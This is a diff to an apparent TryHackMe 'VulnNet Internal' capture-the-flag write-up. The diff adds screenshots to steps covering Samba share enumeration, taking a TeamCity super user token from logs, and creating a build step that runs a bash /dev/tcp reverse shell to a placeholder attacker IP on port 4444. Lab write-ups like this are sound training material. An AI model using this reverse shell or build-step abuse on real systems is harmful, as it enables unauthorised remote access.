@@ -44,10 +44,15 @@ lets start enumerating with the samba shares.
 smbclient -L //<target_ip> -N
 ```
 `Sharename       Type      Comment
+       
         ---------       ----      -------
+        
         print$          Disk      Printer Drivers
+        
         shares          Disk      VulnNet Business Shares
+        
         IPC$            IPC       IPC Service (ip-10-80-174-137 server (Samba, Ubuntu))`
+
 so there is a share named as "share". lets access this share to get any leads.
 
 ```bash
@@ -150,15 +155,27 @@ cat /TeamCity/logs/catalina.out
 
 `NOTE: Copy the latest super user authentication token, it probably starts with a '6'. make sure that you do not select the older super user tokens since they might be invalid`
 
+![image1](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2000-19-54%20Log%20in%20to%20TeamCity%20%E2%80%94%20TeamCity.png)
+
 now we have access to the super user dash board. lets try to upload a reverse shell on this page somehow. start by creating a project. name it anything. 
+
+![image2](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2000-22-27%20Log%20in%20as%20Super%20user%20%E2%80%94%20TeamCity.png)
 
 after that save the changes and then click on the build configuration option
 
+![image3](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-00-03%20Create%20Project%20%E2%80%94%20TeamCity.png)
+
 fill the details and save it. 
+
+![image4](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-02-05%20Create%20Build%20Configuration%20%E2%80%94%20TeamCity.png)
 
 afterwards you will see an option at the left hand side which says to build steps. we can probably inject a reverseshell here because this is the page where we add the actual content of the project.
 
+![image5](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-03-14%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)
+
 select the `Command line` option and then paste this reverseshell payload to the command interface
+
+![image6](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-27-26%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
